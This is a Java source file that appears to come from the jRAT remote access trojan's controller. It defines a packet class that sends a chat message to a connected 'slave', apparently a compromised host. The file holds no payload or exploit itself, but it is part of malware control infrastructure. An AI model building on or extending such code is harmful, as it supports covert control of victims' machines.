package jrat.controller.packets.outgoing;

import jrat.controller.Slave;
import java.io.DataOutputStream;


public class Packet51ChatMessage extends AbstractOutgoingPacket {

	private String message;

	public Packet51ChatMessage(String message) {
		this.message = message;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(message);
	}

	@Override
	public short getPacketId() {
		return 51;
	}

}
